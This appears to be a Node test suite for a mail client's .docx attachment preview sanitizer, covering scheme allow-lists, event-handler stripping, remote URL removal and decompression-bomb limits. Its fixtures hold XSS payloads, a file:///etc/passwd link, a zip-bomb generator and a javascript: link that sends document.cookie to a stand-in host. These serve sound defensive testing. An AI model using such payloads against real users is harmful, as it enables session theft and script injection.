import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test, { after } from "node:test";
import { fileURLToPath, pathToFileURL } from "node:url";
import { build } from "esbuild";
import JSZip from "jszip";
import { JSDOM } from "jsdom";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const outDir = mkdtempSync(join(tmpdir(), "mailflare-docx-"));
after(() => rmSync(outDir, { recursive: true, force: true }));

async function bundle(entry, outfile) {
	await build({
		entryPoints: [join(root, entry)],
		outfile: join(outDir, outfile),
		bundle: true,
		platform: "node",
		format: "esm",
		target: "node22",
		logLevel: "silent",
		alias: { "@": join(root, "src") },
	});
	return import(pathToFileURL(join(outDir, outfile)).href);
}

// A DOM is needed for the sanitizer and for docx-preview. Install it before
// importing either.
const dom = new JSDOM("<!doctype html><html><body></body></html>", {
	url: "https://mail.example.test/",
	pretendToBeVisual: true,
});
globalThis.window = dom.window;
globalThis.document = dom.window.document;
globalThis.Node = dom.window.Node;
globalThis.Element = dom.window.Element;
globalThis.HTMLElement = dom.window.HTMLElement;
globalThis.SVGElement = dom.window.SVGElement;
globalThis.DOMParser = dom.window.DOMParser;
globalThis.Range = dom.window.Range;
try {
	Object.defineProperty(globalThis, "navigator", { value: dom.window.navigator, configurable: true });
} catch {
	// Node exposes a getter-only navigator; leave it if it cannot be redefined.
}
globalThis.requestAnimationFrame = (cb) => setTimeout(() => cb(Date.now()), 0);
globalThis.cancelAnimationFrame = (id) => clearTimeout(id);

const utils = await bundle("src/components/message-attachment-docx-preview-utils.ts", "utils.mjs");
const viewerUtils = await bundle("src/components/message-attachment-viewer-utils.ts", "viewer-utils.mjs");
const { renderAsync } = await import("docx-preview");

const DOCX_MIME = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";

function container(html) {
	const el = document.createElement("div");
	el.innerHTML = html;
	return el;
}

const W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
const R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

/** Build a minimal but valid .docx (zip) for docx-preview to render. */
async function makeDocx({ bodyXml, documentRels = "", extraFiles = {}, contentTypesExtra = "" }) {
	const zip = new JSZip();
	zip.file(
		"[Content_Types].xml",
		`<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Default Extension="png" ContentType="image/png"/>
<Default Extension="html" ContentType="text/html"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
${contentTypesExtra}
</Types>`,
	);
	zip.file(
		"_rels/.rels",
		`<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="${R_NS}/officeDocument" Target="word/document.xml"/>
</Relationships>`,
	);
	zip.file(
		"word/document.xml",
		`<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="${W_NS}" xmlns:r="${R_NS}" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
<w:body>${bodyXml}</w:body>
</w:document>`,
	);
	zip.file(
		"word/_rels/document.xml.rels",
		`<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${documentRels}</Relationships>`,
	);
	for (const [path, content] of Object.entries(extraFiles)) zip.file(path, content);
	return await zip.generateAsync({ type: "arraybuffer" });
}

function paragraph(text) {
	return `<w:p><w:r><w:t xml:space="preserve">${text}</w:t></w:r></w:p>`;
}

function hyperlink(rid, text) {
	return `<w:p><w:hyperlink r:id="${rid}"><w:r><w:t>${text}</w:t></w:r></w:hyperlink></w:p>`;
}

function embeddedImage(rid) {
	return `<w:p><w:r><w:drawing><wp:inline><wp:extent cx="100000" cy="100000"/><wp:docPr id="1" name="Picture 1"/><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr id="1" name="img"/><pic:cNvPicPr/></pic:nvPicPr><pic:blipFill><a:blip r:embed="${rid}"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill><pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="100000" cy="100000"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>`;
}

async function renderDocx(bytes) {
	const body = document.createElement("div");
	const styles = document.createElement("div");
	await renderAsync(bytes, body, styles, {
		className: "docx",
		inWrapper: true,
		breakPages: true,
		ignoreLastRenderedPageBreak: true,
		useBase64URL: true,
	});
	utils.sanitizeRenderedDocx(body);
	return body;
}

// ---------------------------------------------------------------------------
// Viewer wiring
// ---------------------------------------------------------------------------

test("isDocxAttachment matches mime and extension (case-insensitive)", () => {
	assert.equal(viewerUtils.isDocxAttachment({ type: DOCX_MIME, filename: "x" }), true);
	assert.equal(viewerUtils.isDocxAttachment({ type: "", filename: "Report.DOCX" }), true);
	assert.equal(viewerUtils.isDocxAttachment({ type: "application/pdf", filename: "x.pdf" }), false);
});

test("getAttachmentPreviewKind routes docx and leaves legacy .doc unsupported", () => {
	assert.equal(viewerUtils.getAttachmentPreviewKind({ type: DOCX_MIME, filename: "a.docx" }), "docx");
	assert.equal(viewerUtils.getAttachmentPreviewKind({ type: "", filename: "a.docx" }), "docx");
	assert.equal(viewerUtils.getAttachmentPreviewKind({ type: "application/msword", filename: "a.doc" }), "unsupported");
});

// ---------------------------------------------------------------------------
// Sanitizer
// ---------------------------------------------------------------------------

test("removes script/iframe/object/embed/form", () => {
	const el = container(
		`<p>ok</p><script>window.x=1</script><iframe src="x"></iframe><object></object><embed><form><input></form>`,
	);
	utils.sanitizeRenderedDocx(el);
	for (const sel of ["script", "iframe", "object", "embed", "form"]) {
		assert.equal(el.querySelector(sel), null, `${sel} should be removed`);
	}
	assert.match(el.textContent, /ok/);
});

test("strips event-handler attributes everywhere", () => {
	const el = container(`<p onclick="alert(1)" onmouseover="x()">a</p><img src="data:image/png;base64,AAAA" onerror="alert(2)">`);
	utils.sanitizeRenderedDocx(el);
	for (const node of el.querySelectorAll("*")) {
		for (const attr of node.attributes) {
			assert.ok(!attr.name.toLowerCase().startsWith("on"), `handler ${attr.name} survived`);
		}
	}
});

test("anchor scheme allow-list: keeps http/https/mailto/#, drops everything else", () => {
	const el = container(`
		<a id="js" href="javascript:alert(1)">1</a>
		<a id="mixed" href="JaVaScRiPt:alert(1)">2</a>
		<a id="tab" href="java\tscript:alert(1)">3</a>
		<a id="data" href="data:text/html,<script>alert(1)</script>">4</a>
		<a id="vb" href="vbscript:msgbox(1)">5</a>
		<a id="file" href="file:///etc/passwd">6</a>
		<a id="https" href="https://example.com/x">7</a>
		<a id="mail" href="mailto:a@b.co">8</a>
		<a id="frag" href="#section">9</a>`);
	utils.sanitizeRenderedDocx(el);

	for (const id of ["js", "mixed", "tab", "data", "vb", "file"]) {
		assert.equal(el.querySelector(`#${id}`).getAttribute("href"), null, `${id} href not removed`);
	}
	const https = el.querySelector("#https");
	assert.equal(https.getAttribute("href"), "https://example.com/x");
	assert.equal(https.getAttribute("target"), "_blank");
	assert.equal(https.getAttribute("rel"), "noopener noreferrer nofollow");
	assert.equal(el.querySelector("#mail").getAttribute("href"), "mailto:a@b.co");
	assert.equal(el.querySelector("#frag").getAttribute("href"), "#section");
});

test("strips remote resource URLs, keeps inline data: images", () => {
	const el = container(`
		<img id="remote" src="https://evil.test/track.png">
		<img id="local" src="data:image/png;base64,AAAA">
		<svg><image id="svgimg" href="https://evil.test/a.png"></image><use id="svguse" xlink:href="https://evil.test/b.svg"></use></svg>`);
	utils.sanitizeRenderedDocx(el);
	assert.equal(el.querySelector("#remote").getAttribute("src"), null);
	assert.equal(el.querySelector("#local").getAttribute("src"), "data:image/png;base64,AAAA");
	assert.equal(el.querySelector("#svgimg").getAttribute("href"), null);
	assert.equal(el.querySelector("#svguse").getAttribute("xlink:href"), null);
});

test("neutralises remote url() in inline styles and <style> blocks", () => {
	const el = container(`<div id="s" style="background:url(https://evil.test/bg.png)">x</div><style>.a{background:url(http://evil.test/s.png)}</style>`);
	utils.sanitizeRenderedDocx(el);
	assert.ok(!/evil\.test/.test(el.querySelector("#s").getAttribute("style")), "inline url leaked");
	assert.ok(!/evil\.test/.test(el.querySelector("style").textContent), "stylesheet url leaked");
});

// ---------------------------------------------------------------------------
// Size limits (decompression bomb)
// ---------------------------------------------------------------------------

test("size guard accepts a normal document", async () => {
	const bytes = await makeDocx({ bodyXml: paragraph("hi") });
	await assert.doesNotReject(() => utils.assertDocxWithinSizeLimits(bytes));
});

test("size guard rejects non-zip input", async () => {
	const bytes = new TextEncoder().encode("this is not a docx at all").buffer;
	await assert.rejects(() => utils.assertDocxWithinSizeLimits(bytes), /not a readable Word document/);
});

test("size guard rejects a decompression bomb from the central directory", async () => {
	const zip = new JSZip();
	zip.file("bomb.bin", new Uint8Array(200 * 1024 * 1024)); // 200MB of zeros, compresses tiny
	const bytes = await zip.generateAsync({ type: "arraybuffer", compression: "DEFLATE" });
	assert.ok(bytes.byteLength < 10 * 1024 * 1024, "fixture should be far smaller than its uncompressed size");
	await assert.rejects(() => utils.assertDocxWithinSizeLimits(bytes), /too large to preview/);
});

// ---------------------------------------------------------------------------
// End-to-end: real docx-preview rendering of crafted documents
// ---------------------------------------------------------------------------

test("renders a normal document", async () => {
	const bytes = await makeDocx({ bodyXml: paragraph("Hello world from a real docx") });
	const body = await renderDocx(bytes);
	assert.match(body.textContent, /Hello world from a real docx/);
});

test("a javascript: hyperlink relationship cannot survive as a clickable link", async () => {
	const bytes = await makeDocx({
		bodyXml: hyperlink("rIdJs", "click me"),
		documentRels: `<Relationship Id="rIdJs" Type="${R_NS}/hyperlink" Target="javascript:fetch('https://evil.test/'+document.cookie)" TargetMode="External"/>`,
	});
	const body = await renderDocx(bytes);
	assert.match(body.textContent, /click me/);
	for (const a of body.querySelectorAll("a")) {
		const href = a.getAttribute("href") ?? "";
		assert.ok(!/javascript:/i.test(href), "javascript: href survived end to end");
	}
});

test("an https hyperlink is kept and hardened (target/rel)", async () => {
	const bytes = await makeDocx({
		bodyXml: hyperlink("rIdOk", "safe link"),
		documentRels: `<Relationship Id="rIdOk" Type="${R_NS}/hyperlink" Target="https://example.com/page" TargetMode="External"/>`,
	});
	const body = await renderDocx(bytes);
	const a = [...body.querySelectorAll("a")].find((n) => /safe link/.test(n.textContent));
	assert.ok(a, "link not rendered");
	assert.equal(a.getAttribute("href"), "https://example.com/page");
	assert.equal(a.getAttribute("rel"), "noopener noreferrer nofollow");
});

test("an embedded image is inlined as data:, never a remote URL", async () => {
	const png = Uint8Array.from([137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]);
	const bytes = await makeDocx({
		bodyXml: embeddedImage("rIdImg"),
		documentRels: `<Relationship Id="rIdImg" Type="${R_NS}/image" Target="media/image1.png"/>`,
		extraFiles: { "word/media/image1.png": png },
	});
	const body = await renderDocx(bytes);
	const img = body.querySelector("img");
	if (img) {
		const src = img.getAttribute("src") ?? "";
		assert.ok(src === "" || src.startsWith("data:"), `image src not inlined: ${src}`);
	}
});

test("altChunk HTML with a script is not rendered", async () => {
	const bytes = await makeDocx({
		bodyXml: `<w:altChunk r:id="rIdHtml"/>`,
		documentRels: `<Relationship Id="rIdHtml" Type="${R_NS}/aFChunk" Target="chunk.html"/>`,
		extraFiles: { "word/chunk.html": `<html><body><script>window.pwned=1</script></body></html>` },
	});
	const body = await renderDocx(bytes);
	assert.equal(body.querySelector("script"), null);
	assert.equal(body.querySelector("iframe"), null);
});
